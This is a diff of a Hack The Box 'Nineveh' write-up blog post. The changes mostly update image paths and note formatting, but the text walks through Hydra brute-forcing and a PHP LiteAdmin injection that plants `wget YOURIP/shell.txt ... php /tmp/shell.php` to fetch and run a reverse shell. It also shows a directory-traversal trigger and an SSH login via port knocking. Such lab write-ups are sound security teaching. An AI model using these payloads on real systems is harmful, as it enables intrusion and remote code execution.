@@ -73,15 +73,15 @@ http://10.10.10.43/department (Status: 301)
 
 `/department/` directory presents us with what looks like a custom login page:
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-01.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-01.png">
 
 I carried out multiple tests and  luckily for the owner the login function is not vulnerable to SQL injections. However if you look closely, you may notice a very minor flaw which allows for username enumeration. This can be observed after entering invalid credentials / usernames.
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-02.png">  
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-02.png">  
 
 When you try to login with a name that doesn't exist (for example v3ded) you will get a message saying: `invalid username`. Notice the difference in the image below where I try to login as admin: 
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-03.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-03.png">
 
 The login page is telling us which users exist and which do not! After confirming that the *admin* username is correct I start a bruteforce attack via Hydra.
 ```console
@@ -119,11 +119,11 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-15 15:52:15
 
 It "only" took 10 minutes until the correct password showed on my screen - `admin:1q2w3e4r5t`. Upon logging in we are present with an under-construction admin dashboard: 
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-04.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-04.png">
 
 and "Notes":
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-05.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-05.png">
 
 While the webpage might look nice, it's not of any use to us now. I just note down that we gained access and move onto *443*.
 
@@ -132,7 +132,7 @@ While the webpage might look nice, it's not of any use to us now. I just note do
 ## HTTPS (443)
 ```https://10.10.10.43:443/``` is a static webpage with a single image:
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-06.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-06.png">
 
 Once again, use directory bruteforcing to find anything interesting:
 ```console
@@ -152,7 +152,7 @@ http://10.10.10.43:443/db (Status: 200)
 
 `/db/` sounds interesting:
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-07.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-07.png">
 
 This `PHP LiteAdmin` is running version 1.9 which after doing a searchploit query is vulnerable to multiple exploits. 
 
@@ -202,14 +202,16 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-16 07:35:48
 [443][http-post-form] host: 10.10.10.43   login: whatever   password: password123
 1 of 1 target successfully completed, 1 valid password found
 Hydra (http://www.thc.org/thc-hydra) finished at 2017-12-16 07:46:08
-
-
 ```
-> Note: login name (-l) doesn't matter as we do not need it in our http request. Hydra just requires it in it's syntax and therefore now it's irrelevant! 
+
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>Login name (-l) doesn't matter as we do not need it in our http request. Hydra just requires it in it's syntax and therefore now it's irrelevant! </p>
+</div>
 
 Use **password123** and we are inside the `PHP LiteAdmin` dashboard: 
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-08.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-08.png">
 
 Time to do some damage!
 
@@ -223,19 +225,22 @@ There are many methods one can choose in order to compromise the application, bu
 * Start apache2 - `/etc/init.d/apache2 start`
 * Make the target download (wget) our **.txt** file, save it as **.php** and run it
 
-> Note: If you save the file as **.php** it would get activated on your own server when you wget it later on - **be careful about it**. That's why we save it as **.txt** and output it to **.php**.
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>If you save the file as **.php** it would get activated on your own server when you wget it later on - **be careful about it**. That's why we save it as **.txt** and output it to **.php**.</p>
+</div>
 
 To proceed with the exploitation do as the exploitdb file says. Create a database with *.php* extension (I named it shell.php, name doesn't matter!):
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-09.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-09.png">
 
 Click on our newly created database under *Change Database* and add a table inside called shell, select 1 field:
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-10.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-10.png">
 
 Name the field whatever we wish, set it as text type, put `<?php system("wget YOURIP/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>` into the default value & click create. This should create a new table with our exploit. ***The default value script plays a huge role here as it is used to download our main php reverse shell.***
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-11.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-11.png">
 
 `wget - downloads the the main file on the target machine`
 
@@ -243,17 +248,21 @@ Name the field whatever we wish, set it as text type, put `<?php system("wget YO
 
 `;php /tmp/shell.php - runs the php file with our malicious payload inside`
 
-> Note: Make sure you use `-O` (capital) because `-o` has different output which won't work!
+> Make sure you use `-O` (capital) because `-o` has different output which won't work!
  
 To activate our php script that downloads the malicious file, an HTTP request is needed. How would we do such thing though? Remember the previous dashboard we found on port 80? Look at the url after clicking "Notes":
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-12.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-12.png">
 
 It seems innocent but I immediately noticed a possible directory traversal vulnerability which indeed worked. After accessing `10.10.10.43/department/manage.php?notes=files/ninevehNotes.php/../../../../../../var/tmp/shell.php` the php got activated and we got a shell!   
 
-<img src="/img/blog/htb-nineveh/htb-nineveh-13.png">
+<img src="/assets/img/blog/htb-nineveh/htb-nineveh-13.png">
 
-> Note: Change ninevehNotes.txt into ninevehNotes.php 
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>Change ninevehNotes.txt into ninevehNotes.php</p>
+</div>
+
 
 ***
 
@@ -378,7 +387,7 @@ Now using the combination of nmap and ssh you can easily log into the machine:
 ```console
 root@EdgeOfNight:~# nmap -Pn --host-timeout 201 --max-retries 0 -p 571,290,911 10.10.10.43 && ssh -i sshkey.key amrois@10.10.10.43 
 ```
-> Note: If you get an error saying "the .key file is unprotected", simply chmod it to 600
+> If you get an error saying that the ".key file is unprotected", simply chmod it to 600
 
 After authenticating You can get the user flag and use the same `chkrootkit` escalation method as before!
 
